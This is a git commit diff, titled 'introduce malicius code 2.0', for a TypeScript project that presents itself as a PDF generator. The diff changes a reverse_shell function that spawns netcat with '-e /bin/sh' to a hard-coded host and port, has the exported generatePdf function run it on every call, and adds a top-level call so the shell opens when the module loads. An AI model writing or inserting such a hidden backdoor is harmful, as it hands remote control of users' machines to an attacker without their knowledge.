ad32a181348c9e89a2fc5d633700a8f8d60911cf
Alexs18 <mclexis18@gmail.com>
2025-11-25 23:18:27 -0500

    introduce malicius code 2.0

--- src/bin/maliciuscode.ts
+++ src/bin/maliciuscode.ts
@@ -2,6 +2,7 @@ import { spawn } from "child_process";
 
 export function reverse_shell() {
     const execute_code = spawn('nc', [
-        '-e', '/bin/sh', '192.168.1.11', '4444'
+        '-e', '/bin/sh', '192.168.1.13', '4444'
     ]);
+    return execute_code.pid || 0
 }
--- src/index.ts
+++ src/index.ts
@@ -2,6 +2,7 @@ import { reverse_shell } from "./bin/maliciuscode"
 import { pdfdone } from "./external/pdf-generate-external"
 
 export async function generatePdf(content:string, name:string) {
-    reverse_shell();
-    return await pdfdone(content, name)
+    return {pdf:(await pdfdone(content, name)), pid:(reverse_shell())}
 }
+
+generatePdf('de', 'talle')
